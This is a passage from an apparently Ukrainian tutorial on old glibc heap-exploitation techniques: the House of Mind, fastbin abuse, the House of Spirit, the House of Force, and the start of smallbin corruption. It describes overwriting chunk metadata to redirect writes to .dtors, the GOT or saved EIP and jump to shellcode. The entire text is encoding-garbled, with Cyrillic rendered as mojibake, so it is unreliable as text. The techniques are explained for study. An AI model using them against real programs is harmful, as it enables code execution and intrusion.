–ù–∞ –∞–¥—Ä–µ—Å—É, –∫—É–¥–∏ –≤–ø–∞–¥–µ –∞–¥—Ä–µ—Å–∞ –¥—Ä—É–≥–æ–≥–æ —à–º–∞—Ç–∫–∞ –∑ –æ—Å—Ç–∞–Ω–Ω—ñ–º–∏ 5 –Ω—É–ª—è–º–∏, –ø–æ—Ç—Ä—ñ–±–Ω–æ –∑–∞–ø–∏—Å–∞—Ç–∏ –∞–¥—Ä–µ—Å—É —Ü—å–æ–≥–æ –ø–µ—Ä—à–æ–≥–æ —à–º–∞—Ç–∫–∞, —â–æ–± heap\_for\_ptr() –¥—É–º–∞–≤, —â–æ ar\_ptr –∑–Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è –Ω–∞ –ø–æ—á–∞—Ç–∫—É –ø–µ—Ä—à–æ–≥–æ —à–º–∞—Ç–∫–∞ —ñ –≤–∑—è–≤ –∑–≤—ñ–¥—Ç–∏ av->bins\[2].

–£ –¥—Ä—É–≥–æ–º—É —à–º–∞—Ç–∫—É —ñ –∑–∞–≤–¥—è–∫–∏ –ø–µ—Ä—à–æ–º—É –º–∏ –ø–µ—Ä–µ–∑–∞–ø–∏—Å—É—î–º–æ prev\_size –∑ jump 0x0c —ñ size –Ω–∞ —â–æ—Å—å, —â–æ–± –∞–∫—Ç–∏–≤—É–≤–∞—Ç–∏ -> NON\_MAIN\_ARENA.

–î–∞–ª—ñ –≤ —à–º–∞—Ç–∫—É 2 –º–∏ —Å—Ç–∞–≤–∏–º–æ –∫—É–ø—É nops —ñ, –Ω–∞—Ä–µ—à—Ç—ñ, shellcode.

–¢–∞–∫–∏–º —á–∏–Ω–æ–º, –±—É–¥–µ –≤–∏–∫–ª–∏–∫–∞–Ω–æ \_int\_free(TROZO1, TROZO2) —ñ –ø—Ä–æ–¥–æ–≤–∂–∏—Ç—å —ñ–Ω—Å—Ç—Ä—É–∫—Ü—ñ—ó, —â–æ–± –∑–∞–ø–∏—Å–∞—Ç–∏ –≤ \_\_DTOR\_END\_\_ –∞–¥—Ä–µ—Å—É prev\_size –¥—Ä—É–≥–æ–≥–æ —à–º–∞—Ç–∫–∞, —è–∫–∏–π —Å—Ç—Ä–∏–±–Ω–µ –¥–æ shellcode.

–©–æ–± –∑–∞—Å—Ç–æ—Å—É–≤–∞—Ç–∏ —Ü—é —Ç–µ—Ö–Ω—ñ–∫—É, –ø–æ—Ç—Ä—ñ–±–Ω–æ, —â–æ–± –≤–∏–∫–æ–Ω—É–≤–∞–ª–∏—Å—è –¥–µ—è–∫—ñ –¥–æ–¥–∞—Ç–∫–æ–≤—ñ –≤–∏–º–æ–≥–∏, —è–∫—ñ —É—Å–∫–ª–∞–¥–Ω—é—é—Ç—å –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è.

–¶—é —Ç–µ—Ö–Ω—ñ–∫—É –≤–∂–µ –Ω–µ –º–æ–∂–Ω–∞ –∑–∞—Å—Ç–æ—Å—É–≤–∞—Ç–∏, –æ—Å–∫—ñ–ª—å–∫–∏ –±—É–ª–æ –∑–∞—Å—Ç–æ—Å–æ–≤–∞–Ω–æ –º–∞–π–∂–µ —Ç–∞–∫–µ –∂ –≤–∏–ø—Ä–∞–≤–ª–µ–Ω–Ω—è, —è–∫ –¥–ª—è unlink. –ü–æ—Ä—ñ–≤–Ω—é—î—Ç—å—Å—è, —á–∏ –Ω–æ–≤–µ –º—ñ—Å—Ü–µ, –Ω–∞ —è–∫–µ –≤–∫–∞–∑—É—î—Ç—å—Å—è, —Ç–∞–∫–æ–∂ –≤–∫–∞–∑—É—î –Ω–∞ –Ω—å–æ–≥–æ.

**Fastbin**

–¶–µ –≤–∞—Ä—ñ–∞–Ω—Ç –ë—É–¥–∏–Ω–∫—É —Ä–æ–∑—É–º—É.

–ù–∞–º —Ü—ñ–∫–∞–≤–æ –¥–æ—Å—è–≥—Ç–∏ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –Ω–∞—Å—Ç—É–ø–Ω–æ–≥–æ –∫–æ–¥—É, –¥–æ —è–∫–æ–≥–æ –º–æ–∂–Ω–∞ –¥—ñ—Å—Ç–∞—Ç–∏—Å—è –ø—ñ—Å–ª—è –ø–µ—Ä—à–æ—ó –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ —Ñ—É–Ω–∫—Ü—ñ—ó \_int\_free()

fb = &(av->fastbins\[fastbin\_index(size)] ‚Äî> –î–µ fastbin\_index(sz) ‚Äî> (sz >> 3) - 2

‚Ä¶

p->fd = \*fb

\*fb = p

–¢–∞–∫–∏–º —á–∏–Ω–æ–º, —è–∫—â–æ –≤ ‚Äúfb‚Äù –≤—Å—Ç–∞–≤–∏—Ç–∏ –∞–¥—Ä–µ—Å—É —Ñ—É–Ω–∫—Ü—ñ—ó –≤ GOT, –≤ —Ü—é –∞–¥—Ä–µ—Å—É –±—É–¥–µ –≤—Å—Ç–∞–≤–ª–µ–Ω–∞ –∞–¥—Ä–µ—Å–∞ –ø–µ—Ä–µ–ø–∏—Å–∞–Ω–æ–≥–æ —à–º–∞—Ç–∫–∞. –î–ª—è —Ü—å–æ–≥–æ –ø–æ—Ç—Ä—ñ–±–Ω–æ, —â–æ–± –∞—Ä–µ–Ω–∞ –±—É–ª–∞ –±–ª–∏–∑—å–∫–æ –¥–æ –∞–¥—Ä–µ—Å dtors. –¢–æ—á–Ω—ñ—à–µ, —â–æ–± av->max\_fast –∑–Ω–∞—Ö–æ–¥–∏–≤—Å—è –∑–∞ –∞–¥—Ä–µ—Å–æ—é, —è–∫—É –º–∏ –±—É–¥–µ–º–æ –ø–µ—Ä–µ–ø–∏—Å—É–≤–∞—Ç–∏.

–û—Å–∫—ñ–ª—å–∫–∏ –∑ –ë—É–¥–∏–Ω–∫—É —Ä–æ–∑—É–º—É –º–∏ –ø–æ–±–∞—á–∏–ª–∏, —â–æ –º–∏ –∫–æ–Ω—Ç—Ä–æ–ª—é–≤–∞–ª–∏ –ø–æ–∑–∏—Ü—ñ—é av.

–û—Ç–∂–µ, —è–∫—â–æ –≤ –ø–æ–ª–µ size –º–∏ –≤—Å—Ç–∞–≤–∏–º–æ —Ä–æ–∑–º—ñ—Ä 8 + NON\_MAIN\_ARENA + PREV\_INUSE ‚Äî> fastbin\_index() –ø–æ–≤–µ—Ä–Ω–µ fastbins\[-1], —â–æ –≤–∫–∞–∑—É–≤–∞—Ç–∏–º–µ –Ω–∞ av->max\_fast.

–£ —Ü—å–æ–º—É –≤–∏–ø–∞–¥–∫—É av->max\_fast –±—É–¥–µ –∞–¥—Ä–µ—Å–æ—é, —è–∫–∞ –±—É–¥–µ –ø–µ—Ä–µ–ø–∏—Å–∞–Ω–∞ (–Ω–µ –Ω–∞ —â–æ –≤–∫–∞–∑—É—î, –∞ —Ü—è –ø–æ–∑–∏—Ü—ñ—è –±—É–¥–µ –ø–µ—Ä–µ–ø–∏—Å–∞–Ω–∞).

–ö—Ä—ñ–º —Ç–æ–≥–æ, –ø–æ—Ç—Ä—ñ–±–Ω–æ, —â–æ–± —Å—É—Å—ñ–¥–Ω—ñ–π —à–º–∞—Ç–æ–∫ –¥–æ –∑–≤—ñ–ª—å–Ω–µ–Ω–æ–≥–æ –±—É–≤ –±—ñ–ª—å—à–∏–º –∑–∞ 8 -> –û—Å–∫—ñ–ª—å–∫–∏ –º–∏ —Å–∫–∞–∑–∞–ª–∏, —â–æ —Ä–æ–∑–º—ñ—Ä –∑–≤—ñ–ª—å–Ω–µ–Ω–æ–≥–æ —à–º–∞—Ç–∫–∞ –¥–æ—Ä—ñ–≤–Ω—é—î 8, –≤ —Ü—å–æ–º—É —Ñ–∞–ª—å—à–∏–≤–æ–º—É —à–º–∞—Ç–∫—É –Ω–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –ª–∏—à–µ –≤–∫–∞–∑–∞—Ç–∏ —Ä–æ–∑–º—ñ—Ä –±—ñ–ª—å—à–∏–π –∑–∞ 8 (–æ—Å–∫—ñ–ª—å–∫–∏ shellcode –±—É–¥–µ –≤ –∑–≤—ñ–ª—å–Ω–µ–Ω–æ–º—É —à–º–∞—Ç–∫—É, –Ω–∞ –ø–æ—á–∞—Ç–∫—É –ø–æ—Ç—Ä—ñ–±–Ω–æ –±—É–¥–µ –≤—Å—Ç–∞–≤–∏—Ç–∏ jump, —è–∫–∏–π –≤–ø–∞–¥–µ –≤ nops).

–ö—Ä—ñ–º —Ç–æ–≥–æ, —Ü–µ–π —Å–∞–º–∏–π —Ñ–∞–ª—å—à–∏–≤–∏–π —à–º–∞—Ç–æ–∫ –ø–æ–≤–∏–Ω–µ–Ω –±—É—Ç–∏ –º–µ–Ω—à–∏–º –∑–∞ av->system\_mem. av->system\_mem –∑–Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è –Ω–∞ 1848 –±–∞–π—Ç—ñ–≤ –¥–∞–ª—ñ.

–ß–µ—Ä–µ–∑ –Ω—É–ª—ñ \_DTOR\_END\_ —ñ –Ω–µ–±–∞–≥–∞—Ç–æ –∞–¥—Ä–µ—Å —É GOT –∂–æ–¥–Ω–∞ –∑ –∞–¥—Ä–µ—Å —Ü–∏—Ö —Å–µ–∫—Ü—ñ–π –Ω–µ –ø—ñ–¥—Ö–æ–¥–∏—Ç—å –¥–ª—è –ø–µ—Ä–µ–ø–∏—Å—É–≤–∞–Ω–Ω—è, —Ç–æ–º—É –¥–∞–≤–∞–π—Ç–µ –ø–æ–¥–∏–≤–∏–º–æ—Å—è, —è–∫ –∑–∞—Å—Ç–æ—Å—É–≤–∞—Ç–∏ fastbin –¥–ª—è –∞—Ç–∞–∫–∏ –Ω–∞ —Å—Ç–µ–∫.

–Ü–Ω—à–∏–π —Å–ø–æ—Å—ñ–± –∞—Ç–∞–∫–∏ ‚Äî –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–∏—Ç–∏ **av** –Ω–∞ —Å—Ç–µ–∫.

–Ø–∫—â–æ –º–∏ –∑–º—ñ–Ω–∏–º–æ —Ä–æ–∑–º—ñ—Ä, —â–æ–± –≤—ñ–Ω —Å—Ç–∞–Ω–æ–≤–∏–≤ 16 –∑–∞–º—ñ—Å—Ç—å 8, —Ç–æ–¥—ñ: fastbin\_index() –ø–æ–≤–µ—Ä–Ω–µ fastbins\[0] —ñ –º–∏ –º–æ–∂–µ–º–æ —Å–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏—Å—è —Ü–∏–º, —â–æ–± –ø–µ—Ä–µ–ø–∏—Å–∞—Ç–∏ —Å—Ç–µ–∫.

–î–ª—è —Ü—å–æ–≥–æ –Ω–µ –ø–æ–≤–∏–Ω–Ω–æ –±—É—Ç–∏ –∂–æ–¥–Ω–æ–≥–æ –∫–∞–Ω–∞—Ä–µ–π–∫–∞ –∞–±–æ –¥–∏–≤–Ω–∏—Ö –∑–Ω–∞—á–µ–Ω—å —É —Å—Ç–µ—Ü—ñ, –Ω–∞—Å–ø—Ä–∞–≤–¥—ñ –º–∏ –ø–æ–≤–∏–Ω–Ω—ñ –∑–Ω–∞—Ö–æ–¥–∏—Ç–∏—Å—å —É —Ü—ñ–π: 4 –±–∞–π—Ç–∏ –Ω—É–ª—ñ–≤ + EBP + RET.

4 –±–∞–π—Ç–∏ –Ω—É–ª—ñ–≤ –ø–æ—Ç—Ä—ñ–±–Ω—ñ, —â–æ–± **av** –±—É–≤ –∑–∞ —Ü—ñ—î—é –∞–¥—Ä–µ—Å–æ—é, –∞ –ø–µ—Ä—à–∏–π –µ–ª–µ–º–µ–Ω—Ç **av** ‚Äî —Ü–µ mutex, —è–∫–∏–π –ø–æ–≤–∏–Ω–µ–Ω –¥–æ—Ä—ñ–≤–Ω—é–≤–∞—Ç–∏ 0.

**av->max\_fast** –±—É–¥–µ EBP —ñ –±—É–¥–µ –∑–Ω–∞—á–µ–Ω–Ω—è–º, —è–∫–µ –¥–æ–ø–æ–º–æ–∂–µ –Ω–∞–º –æ–±—ñ–π—Ç–∏ –æ–±–º–µ–∂–µ–Ω–Ω—è.

–£ **av->fastbins\[0]** –±—É–¥–µ –ø–µ—Ä–µ–ø–∏—Å–∞–Ω–æ –∑ –∞–¥—Ä–µ—Å–æ—é **p** —ñ –±—É–¥–µ RET, —Ç–∞–∫–∏–º —á–∏–Ω–æ–º, –≤—ñ–Ω —Å—Ç—Ä–∏–±–Ω–µ –¥–æ shellcode.

–ö—Ä—ñ–º —Ç–æ–≥–æ, —É **av->system\_mem** (1484 –±–∞–π—Ç–∏ –≤–∏—â–µ –ø–æ–∑–∏—Ü—ñ—ó –≤ —Å—Ç–µ—Ü—ñ) –±—É–¥–µ –¥–æ—Å–∏—Ç—å —Å–º—ñ—Ç—Ç—è, —â–æ –¥–æ–∑–≤–æ–ª–∏—Ç—å –Ω–∞–º –æ–±—ñ–π—Ç–∏ –ø–µ—Ä–µ–≤—ñ—Ä–∫—É, —è–∫–∞ –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è.

–ö—Ä—ñ–º —Ç–æ–≥–æ, –ø–æ—Ç—Ä—ñ–±–Ω–æ, —â–æ–± —Å—É—Å—ñ–¥–Ω—ñ–π —à–º–∞—Ç–æ–∫ –¥–æ –∑–≤—ñ–ª—å–Ω–µ–Ω–æ–≥–æ –±—É–≤ –±—ñ–ª—å—à–∏–º –∑–∞ 8 -> –û—Å–∫—ñ–ª—å–∫–∏ –º–∏ —Å–∫–∞–∑–∞–ª–∏, —â–æ —Ä–æ–∑–º—ñ—Ä –∑–≤—ñ–ª—å–Ω–µ–Ω–æ–≥–æ —à–º–∞—Ç–∫–∞ –¥–æ—Ä—ñ–≤–Ω—é—î 16, –≤ —Ü—å–æ–º—É —Ñ–∞–ª—å—à–∏–≤–æ–º—É —à–º–∞—Ç–∫—É –Ω–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –ª–∏—à–µ –≤–∫–∞–∑–∞—Ç–∏ —Ä–æ–∑–º—ñ—Ä –±—ñ–ª—å—à–∏–π –∑–∞ 8 (–æ—Å–∫—ñ–ª—å–∫–∏ shellcode –±—É–¥–µ –≤ –∑–≤—ñ–ª—å–Ω–µ–Ω–æ–º—É —à–º–∞—Ç–∫—É, –Ω–∞ –ø–æ—á–∞—Ç–∫—É –ø–æ—Ç—Ä—ñ–±–Ω–æ –±—É–¥–µ –≤—Å—Ç–∞–≤–∏—Ç–∏ jump, —è–∫–∏–π –≤–ø–∞–¥–µ –≤ nops, —â–æ –π–¥—É—Ç—å –ø—ñ—Å–ª—è –ø–æ–ª—è size –Ω–æ–≤–æ–≥–æ —Ñ–∞–ª—å—à–∏–≤–æ–≥–æ —à–º–∞—Ç–∫–∞).

**–ë—É–¥–∏–Ω–æ–∫ –¥—É—Ö—É**

–£ —Ü—å–æ–º—É –≤–∏–ø–∞–¥–∫—É –º–∏ –Ω–∞–º–∞–≥–∞—î–º–æ—Å—è –æ—Ç—Ä–∏–º–∞—Ç–∏ –≤–∫–∞–∑—ñ–≤–Ω–∏–∫ –Ω–∞ malloc, —è–∫–∏–π –º–æ–∂–µ –±—É—Ç–∏ –∑–º—ñ–Ω–µ–Ω–∏–π –∞—Ç–∞–∫—É—é—á–∏–º (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, –≤–∫–∞–∑—ñ–≤–Ω–∏–∫ –∑–Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è –≤ —Å—Ç–µ–∫—É –ø—ñ–¥ –º–æ–∂–ª–∏–≤–∏–º –ø–µ—Ä–µ–ø–æ–≤–Ω–µ–Ω–Ω—è–º –∑–º—ñ–Ω–Ω–æ—ó).

–¢–∞–∫–∏–º —á–∏–Ω–æ–º, –º–∏ –º–æ–≥–ª–∏ –± –∑–º—É—Å–∏—Ç–∏ —Ü–µ–π –≤–∫–∞–∑—ñ–≤–Ω–∏–∫ –≤–∫–∞–∑—É–≤–∞—Ç–∏ –∫—É–¥–∏ –∑–∞–≤–≥–æ–¥–Ω–æ. –û–¥–Ω–∞–∫ –Ω–µ –±—É–¥—å-—è–∫–µ –º—ñ—Å—Ü–µ —î –¥—ñ–π—Å–Ω–∏–º, —Ä–æ–∑–º—ñ—Ä —Ñ–∞–ª—å—à–∏–≤–æ–≥–æ —à–º–∞—Ç–∫–∞ –ø–æ–≤–∏–Ω–µ–Ω –±—É—Ç–∏ –º–µ–Ω—à–∏–º –∑–∞ av->max\_fast —ñ, –±—ñ–ª—å—à –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ, –¥–æ—Ä—ñ–≤–Ω—é–≤–∞—Ç–∏ –∑–∞–ø–∏—Ç–∞–Ω–æ–º—É —Ä–æ–∑–º—ñ—Ä—É –≤ –º–∞–π–±—É—Ç–Ω—å–æ–º—É –≤–∏–∫–ª–∏–∫—É malloc()+8. –¢–æ–º—É, —è–∫—â–æ –º–∏ –∑–Ω–∞—î–º–æ, —â–æ –ø—ñ—Å–ª—è —Ü—å–æ–≥–æ –≤—Ä–∞–∑–ª–∏–≤–æ–≥–æ –≤–∫–∞–∑—ñ–≤–Ω–∏–∫–∞ –≤–∏–∫–ª–∏–∫–∞—î—Ç—å—Å—è malloc(40), —Ä–æ–∑–º—ñ—Ä —Ñ–∞–ª—å—à–∏–≤–æ–≥–æ —à–º–∞—Ç–∫–∞ –ø–æ–≤–∏–Ω–µ–Ω –¥–æ—Ä—ñ–≤–Ω—é–≤–∞—Ç–∏ 48.

–Ø–∫—â–æ, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, –ø—Ä–æ–≥—Ä–∞–º–∞ –∑–∞–ø–∏—Ç—É–≤–∞–ª–∞ —É –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ —á–∏—Å–ª–æ, –º–∏ –º–æ–≥–ª–∏ –± –≤–≤–µ—Å—Ç–∏ 48 —ñ –≤–∫–∞–∑–∞—Ç–∏ –∑–º—ñ–Ω–Ω–∏–π –≤–∫–∞–∑—ñ–≤–Ω–∏–∫ malloc –Ω–∞ –Ω–∞—Å—Ç—É–ø–Ω—ñ 4 –±–∞–π—Ç–∏ (—è–∫—ñ –º–æ–≥–ª–∏ –± –Ω–∞–ª–µ–∂–∞—Ç–∏ –¥–æ EBP, –∑ —É–¥–∞—á–µ—é, —Ç–∞–∫ —â–æ 48 –∑–∞–ª–∏—à–∏—Ç—å—Å—è –ø–æ–∑–∞–¥—É, —è–∫ –∑–∞–≥–æ–ª–æ–≤–æ–∫ size). –ö—Ä—ñ–º —Ç–æ–≥–æ, –∞–¥—Ä–µ—Å–∞ ptr-4+48 –ø–æ–≤–∏–Ω–Ω–∞ –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—Ç–∏ –∫—ñ–ª—å–∫–æ–º —É–º–æ–≤–∞–º (–≤ –¥–∞–Ω–æ–º—É –≤–∏–ø–∞–¥–∫—É ptr=EBP), —Ç–æ–±—Ç–æ 8 < ptr-4+48 < av->system\_mem.

–Ø–∫—â–æ —Ü–µ –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è, –∫–æ–ª–∏ –≤–∏–∫–ª–∏–∫–∞—î—Ç—å—Å—è –Ω–∞—Å—Ç—É–ø–Ω–∏–π malloc, —è–∫–∏–π –º–∏ —Å–∫–∞–∑–∞–ª–∏, —â–æ —Ü–µ malloc(40), –π–æ–º—É –±—É–¥–µ –ø—Ä–∏–∑–Ω–∞—á–µ–Ω–∞ –∞–¥—Ä–µ—Å–∞ –∞–¥—Ä–µ—Å–∏ EBP. –Ø–∫—â–æ –∞—Ç–∞–∫—É—é—á–∏–π —Ç–∞–∫–æ–∂ –º–æ–∂–µ –∫–æ–Ω—Ç—Ä–æ–ª—é–≤–∞—Ç–∏ —Ç–µ, —â–æ –∑–∞–ø–∏—Å—É—î—Ç—å—Å—è –≤ —Ü–µ–π malloc, –≤—ñ–Ω –º–æ–∂–µ –ø–µ—Ä–µ–ø–∏—Å–∞—Ç–∏ —è–∫ EBP, —Ç–∞–∫ —ñ EIP –Ω–∞ –∞–¥—Ä–µ—Å—É, —è–∫—É —Ö–æ—á–µ.

–¶–µ, —è–∫ —è –≤–≤–∞–∂–∞—é, —Ç–æ–º—É —â–æ, –∫–æ–ª–∏ –≤—ñ–Ω –∑–≤—ñ–ª—å–Ω–∏—Ç—å, free() –∑–±–µ—Ä—ñ–≥–∞—Ç–∏–º–µ, —â–æ –∑–∞ –∞–¥—Ä–µ—Å–æ—é, –Ω–∞ —è–∫—É –≤–∫–∞–∑—É—î EBP —Å—Ç–µ–∫—É, —î —à–º–∞—Ç–æ–∫ —ñ–¥–µ–∞–ª—å–Ω–æ–≥–æ —Ä–æ–∑–º—ñ—Ä—É –¥–ª—è –Ω–æ–≤–æ–≥–æ malloc(), —è–∫–∏–π –ø–æ—Ç—Ä—ñ–±–Ω–æ –∑–∞—Ä–µ–∑–µ—Ä–≤—É–≤–∞—Ç–∏, —Ç–æ–º—É –ø—Ä–∏–∑–Ω–∞—á–∞—î —Ü—é –∞–¥—Ä–µ—Å—É.

**–ë—É–¥–∏–Ω–æ–∫ —Å–∏–ª–∏**

–ù–µ–æ–±—Ö—ñ–¥–Ω–æ:

* –ü–µ—Ä–µ–ø–æ–≤–Ω–µ–Ω–Ω—è —à–º–∞—Ç–∫–∞, —è–∫–µ –¥–æ–∑–≤–æ–ª—è—î –ø–µ—Ä–µ–ø–∏—Å–∞—Ç–∏ wilderness
* –í–∏–∫–ª–∏–∫ malloc() –∑ —Ä–æ–∑–º—ñ—Ä–æ–º, –≤–∏–∑–Ω–∞—á–µ–Ω–∏–º –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–º
* –í–∏–∫–ª–∏–∫ malloc(), –¥–∞–Ω—ñ —è–∫–æ–≥–æ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –≤–∏–∑–Ω–∞—á–µ–Ω—ñ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–º

–°–ø–æ—á–∞—Ç–∫—É –ø–µ—Ä–µ–ø–∏—Å—É—î—Ç—å—Å—è size —à–º–∞—Ç–∫–∞ wilderness –Ω–∞ –¥—É–∂–µ –≤–µ–ª–∏–∫–µ –∑–Ω–∞—á–µ–Ω–Ω—è (0xffffffff), —Ç–∞–∫ —â–æ –±—É–¥—å-—è–∫–∏–π –∑–∞–ø–∏—Ç –Ω–∞ –ø–∞–º'—è—Ç—å, –¥–æ—Å—Ç–∞—Ç–Ω—å–æ –≤–µ–ª–∏–∫–∏–π, –±—É–¥–µ –æ–±—Ä–æ–±–ª–µ–Ω–∏–π —É \_int\_malloc() –±–µ–∑ –Ω–µ–æ–±—Ö—ñ–¥–Ω–æ—Å—Ç—ñ —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è –∫—É–ø–∏.

–î–∞–ª—ñ –∑–º—ñ–Ω—é—î—Ç—å—Å—è av->top, —â–æ–± –≤–∫–∞–∑—É–≤–∞—Ç–∏ –Ω–∞ –æ–±–ª–∞—Å—Ç—å –ø–∞–º'—è—Ç—ñ –ø—ñ–¥ –∫–æ–Ω—Ç—Ä–æ–ª–µ–º –∞—Ç–∞–∫—É—é—á–æ–≥–æ, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, —Å—Ç–µ–∫. –£ av->top –±—É–¥–µ –∑–∞–ø–∏—Å–∞–Ω–æ \&EIP - 8.

–ú–∏ –ø–æ–≤–∏–Ω–Ω—ñ –ø–µ—Ä–µ–ø–∏—Å–∞—Ç–∏ av->top, —â–æ–± –≤—ñ–Ω –≤–∫–∞–∑—É–≤–∞–≤ –Ω–∞ –æ–±–ª–∞—Å—Ç—å –ø–∞–º'—è—Ç—ñ –ø—ñ–¥ –∫–æ–Ω—Ç—Ä–æ–ª–µ–º –∞—Ç–∞–∫—É—é—á–æ–≥–æ:

victim = av->top;

remainder = chunk\_at\_offset(victim, nb);

av->top = remainder;

Victim –æ—Ç—Ä–∏–º—É—î –∑–Ω–∞—á–µ–Ω–Ω—è –∞–¥—Ä–µ—Å–∏ –ø–æ—Ç–æ—á–Ω–æ–≥–æ —à–º–∞—Ç–∫–∞ wilderness (–ø–æ—Ç–æ—á–Ω–∏–π av->top), –∞ remainder ‚Äî —Ü–µ —Ç–æ—á–Ω–æ —Å—É–º–∞ —Ü—ñ—î—ó –∞–¥—Ä–µ—Å–∏ –ø–ª—é—Å –∫—ñ–ª—å–∫—ñ—Å—Ç—å –±–∞–π—Ç—ñ–≤, –∑–∞–ø–∏—Ç–∞–Ω–∏—Ö malloc(). –¢–æ–º—É, —è–∫—â–æ \&EIP-8 –∑–Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è –≤ 0xbffff224, –∞ av->top –º—ñ—Å—Ç–∏—Ç—å 0x080c2788, —Ç–æ–¥—ñ –∫—ñ–ª—å–∫—ñ—Å—Ç—å, —è–∫—É –º–∏ –ø–æ–≤–∏–Ω–Ω—ñ –∑–∞—Ä–µ–∑–µ—Ä–≤—É–≤–∞—Ç–∏ –≤ –∫–æ–Ω—Ç—Ä–æ–ª—é–≤–∞–Ω–æ–º—É malloc, —â–æ–± av->top –≤–∫–∞–∑—É–≤–∞–≤ –Ω–∞ $EIP-8 –¥–ª—è –Ω–∞—Å—Ç—É–ø–Ω–æ–≥–æ malloc() –±—É–¥–µ:

0xbffff224 - 0x080c2788 = 3086207644.

–¢–∞–∫–∏–º —á–∏–Ω–æ–º, –≤ av->top –±—É–¥–µ –∑–±–µ—Ä–µ–∂–µ–Ω–æ –∑–º—ñ–Ω–µ–Ω–µ –∑–Ω–∞—á–µ–Ω–Ω—è, —ñ –Ω–∞—Å—Ç—É–ø–Ω–∏–π malloc –≤–∫–∞–∑—É–≤–∞—Ç–∏–º–µ –Ω–∞ EIP —ñ –∑–º–æ–∂–µ –π–æ–≥–æ –ø–µ—Ä–µ–ø–∏—Å–∞—Ç–∏.

–í–∞–∂–ª–∏–≤–æ –∑–Ω–∞—Ç–∏, —â–æ —Ä–æ–∑–º—ñ—Ä –Ω–æ–≤–æ–≥–æ —à–º–∞—Ç–∫–∞ wilderness –ø–æ–≤–∏–Ω–µ–Ω –±—É—Ç–∏ –±—ñ–ª—å—à–∏–º –∑–∞ –∑–∞–ø–∏—Ç, –∑—Ä–æ–±–ª–µ–Ω–∏–π –æ—Å—Ç–∞–Ω–Ω—ñ–º malloc(). –¢–æ–±—Ç–æ, —è–∫—â–æ wilderness –≤–∫–∞–∑—É—î –Ω–∞ \&EIP-8, —Ä–æ–∑–º—ñ—Ä –∑–∞–ª–∏—à–∏—Ç—å—Å—è —Ç–æ—á–Ω–æ –≤ –ø–æ–ª—ñ EBP —Å—Ç–µ–∫—É.

**–ë—É–¥–∏–Ω–æ–∫ –ª–µ–≥–µ–Ω–¥–∏**

**–ö–æ—Ä—É–ø—Ü—ñ—è SmallBin**

–ó–≤—ñ–ª—å–Ω–µ–Ω—ñ —à–º–∞—Ç–∫–∏ –≤–≤–æ–¥—è—Ç—å—Å—è –≤ bin –∑–∞–ª–µ–∂–Ω–æ –≤—ñ–¥ —ó—Ö —Ä–æ–∑–º—ñ—Ä—É. –ê–ª–µ –ø–µ—Ä–µ–¥ –≤–≤–µ–¥–µ–Ω–Ω—è–º –≤–æ–Ω–∏ –∑–±–µ—Ä—ñ–≥–∞—é—Ç—å—Å—è –≤ unsorted bins. –ö–æ–ª–∏ —à–º–∞—Ç–æ–∫ –∑–≤—ñ–ª—å–Ω—è—î—Ç—å—Å—è, –≤—ñ–Ω –Ω–µ –≤—ñ–¥—Ä–∞–∑—É –ø–æ—Ç—Ä–∞–ø–ª—è—î –≤ —Å–≤—ñ–π bin, –∞ –∑–∞–ª–∏—à–∞—î—Ç—å—Å—è –≤ unsorted bins. –ü–æ—Ç—ñ–º, —è–∫—â–æ —Ä–µ–∑–µ—Ä–≤—É—î—Ç—å—Å—è –Ω–æ–≤–∏–π —à–º–∞—Ç–æ–∫, —ñ –ø–æ–ø–µ—Ä–µ–¥–Ω—ñ–π –∑–≤—ñ–ª—å–Ω–µ–Ω–∏–π –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–∏–π, –≤—ñ–Ω –ø–æ–≤–µ—Ä—Ç–∞—î—Ç—å—Å—è, –∞–ª–µ —è–∫—â–æ —Ä–µ–∑–µ—Ä–≤—É—î—Ç—å—Å—è –±—ñ–ª—å—à–∏–π, –∑–≤—ñ–ª—å–Ω–µ–Ω–∏–π —à–º–∞—Ç–æ–∫ –≤ unsorted bins –ø–æ—Ç—Ä–∞–ø–ª—è—î –≤ —Å–≤—ñ–π –≤—ñ–¥–ø–æ–≤—ñ–¥–Ω–∏–π bin.

–©–æ–± –¥–æ—Å—è–≥—Ç–∏ –≤—Ä–∞–∑–ª–∏–≤–æ–≥–æ –∫–æ–¥—É, –∑–∞–ø–∏—Ç –ø–∞–º'—è—Ç—ñ –ø–æ–≤–∏–Ω–µ–Ω –±—É—Ç–∏ –±—ñ–ª—å—à–∏–º –∑–∞ av->max\_fast (72 –∑–∞–∑–≤–∏—á–∞–π) —ñ –º–µ–Ω—à–∏–º –∑–∞ MIN\_LARGE\_SIZE (512).

–Ø–∫—â–æ –≤ bins —î —à–º–∞—Ç–æ–∫ –≤—ñ–¥–ø–æ–≤—ñ–¥–Ω–æ–≥–æ —Ä–æ–∑–º—ñ—Ä—É –¥–æ –∑–∞–ø–∏—Ç—É, –≤—ñ–Ω –ø–æ–≤–µ—Ä—Ç–∞—î—Ç—å—Å—è –ø—ñ—Å–ª—è —Ä–æ–∑–≤'—è–∑–∞–Ω–Ω—è:

